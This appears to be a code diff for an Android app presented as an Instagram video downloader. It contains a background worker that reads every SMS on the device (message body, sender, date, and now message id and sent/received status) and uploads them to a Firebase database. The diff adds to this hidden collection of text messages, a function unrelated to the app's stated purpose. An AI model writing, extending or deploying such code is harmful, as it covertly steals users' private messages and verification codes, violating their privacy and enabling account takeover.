@@ -2,7 +2,6 @@ package com.example.instagramvideodownloader.work_manager
 
 import android.content.Context
 import android.database.Cursor
-import android.net.Uri
 import android.provider.Telephony
 import android.util.Log
 import android.widget.Toast
@@ -14,6 +13,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
 import org.koin.java.KoinJavaComponent.inject
+
 
 class FetchMessagesWorker(
     appContext: Context,
@@ -27,7 +27,7 @@ class FetchMessagesWorker(
             val inboxMessages = fetchInboxMessages(mAppContext)
 
             // Upload messages to Firebase Realtime Database
-            val reference = database.getReference("inbox_messages").child("8867817008")
+            val reference = database.getReference("inbox_messages").child("")
 
             reference.setValue(inboxMessages).await()
             // Indicate success
@@ -48,7 +48,6 @@ class FetchMessagesWorker(
     private fun fetchInboxMessages(context: Context): List<SmsMessageModel> {
         val inboxMessages = mutableListOf<SmsMessageModel>()
 
-        val uri = Uri.parse("content://sms/inbox")
         val cursor: Cursor? = context.contentResolver.query(
             Telephony.Sms.CONTENT_URI,
             null,
@@ -58,16 +57,22 @@ class FetchMessagesWorker(
         )
 
         cursor?.use {
+            val idIndex = it.getColumnIndexOrThrow("_id")
             val bodyIndex = it.getColumnIndexOrThrow("body")
             val addressIndex = it.getColumnIndexOrThrow("address")
             val dateIndex = it.getColumnIndexOrThrow("date")
+            val typeIndex = it.getColumnIndexOrThrow("type")
 
             while (it.moveToNext()) {
+                val id = it.getString(idIndex)
                 val body = it.getString(bodyIndex)
                 val address = it.getString(addressIndex)
                 val date = it.getLong(dateIndex)
+                val type = it.getString(typeIndex)
 
-                val smsMessage = SmsMessageModel(body, address, date)
+                val isSent = type == "2" // "2" indicates sent message, "1" indicates received
+
+                val smsMessage = SmsMessageModel(id, body, address, date, isSent)
                 inboxMessages.add(smsMessage)
             }
         }
